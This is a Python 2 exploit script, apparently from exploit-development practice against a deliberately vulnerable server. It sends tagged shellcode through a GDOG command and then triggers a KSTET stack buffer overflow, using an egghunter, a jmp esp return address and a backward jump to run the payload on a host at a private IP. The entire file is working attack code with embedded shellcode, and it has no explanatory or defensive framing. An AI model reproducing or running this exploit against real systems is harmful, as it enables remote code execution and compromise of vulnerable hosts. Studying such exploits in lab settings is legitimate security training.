#!/usr/bin/python

import socket
import os
import sys
import struct

host = "10.0.2.6"
port = 9999

shellcode = ("\xbf\x2b\xd7\x85\x91\xd9\xc4\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x7d\x12\x03\x7d\x12\x83\xc6\x2b\x67\x64\xe4\x3c\xea"
"\x87\x14\xbd\x8b\x0e\xf1\x8c\x8b\x75\x72\xbe\x3b\xfd\xd6\x33"
"\xb7\x53\xc2\xc0\xb5\x7b\xe5\x61\x73\x5a\xc8\x72\x28\x9e\x4b"
"\xf1\x33\xf3\xab\xc8\xfb\x06\xaa\x0d\xe1\xeb\xfe\xc6\x6d\x59"
"\xee\x63\x3b\x62\x85\x38\xad\xe2\x7a\x88\xcc\xc3\x2d\x82\x96"
"\xc3\xcc\x47\xa3\x4d\xd6\x84\x8e\x04\x6d\x7e\x64\x97\xa7\x4e"
"\x85\x34\x86\x7e\x74\x44\xcf\xb9\x67\x33\x39\xba\x1a\x44\xfe"
"\xc0\xc0\xc1\xe4\x63\x82\x72\xc0\x92\x47\xe4\x83\x99\x2c\x62"
"\xcb\xbd\xb3\xa7\x60\xb9\x38\x46\xa6\x4b\x7a\x6d\x62\x17\xd8"
"\x0c\x33\xfd\x8f\x31\x23\x5e\x6f\x94\x28\x73\x64\xa5\x73\x1c"
"\x49\x84\x8b\xdc\xc5\x9f\xf8\xee\x4a\x34\x96\x42\x02\x92\x61"
"\xa4\x39\x62\xfd\x5b\xc2\x93\xd4\x9f\x96\xc3\x4e\x09\x97\x8f"
"\x8e\xb6\x42\x1f\xde\x18\x3d\xe0\x8e\xd8\xed\x88\xc4\xd6\xd2"
"\xa9\xe7\x3c\x7b\x43\x12\xd7\x8e\x94\x1e\x22\xe7\x96\x1e\x2d"
"\x4c\x1f\xf8\x47\xa2\x76\x53\xf0\x5b\xd3\x2f\x61\xa3\xc9\x4a"
"\xa1\x2f\xfe\xab\x6c\xd8\x8b\xbf\x19\x28\xc6\x9d\x8c\x37\xfc"
"\x89\x53\xa5\x9b\x49\x1d\xd6\x33\x1e\x4a\x28\x4a\xca\x66\x13"
"\xe4\xe8\x7a\xc5\xcf\xa8\xa0\x36\xd1\x31\x24\x02\xf5\x21\xf0"
"\x8b\xb1\x15\xac\xdd\x6f\xc3\x0a\xb4\xc1\xbd\xc4\x6b\x88\x29"
"\x90\x47\x0b\x2f\x9d\x8d\xfd\xcf\x2c\x78\xb8\xf0\x81\xec\x4c"
"\x89\xff\x8c\xb3\x40\x44\xbc\xf9\xc8\xed\x55\xa4\x99\xaf\x3b"
"\x57\x74\xf3\x45\xd4\x7c\x8c\xb1\xc4\xf5\x89\xfe\x42\xe6\xe3"
"\x6f\x27\x08\x57\x8f\x62")

totalsize = 5000
totaloffset = 65

egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"\x77\x30\x30\x74" # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

egg = "\x77\x30\x30\x74" #w00t

buffer = "A"*(totaloffset - len(egghunter))
eip = struct.pack('<I',0x625011af) # jmp esp
#reteax = "\x50\xc3\x90\x90"
#jmpeax = "\xff\xe0"
backwardjmp = "\xeb\xb9"
morejunk = "C" * (5000-65-4-2)

payload = egghunter + buffer + eip + backwardjmp + morejunk

taggedshellcode = egg + egg + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)

print "[+] Sending shellcode into the memory using GDOG ..."
s.send("GDOG " + taggedshellcode)
print s.recv(1024)

print "[+] Sending payload using KSTET overflow ..."
s.send("KSTET /.:/ " + payload)
print s.recv(1024)
s.close()
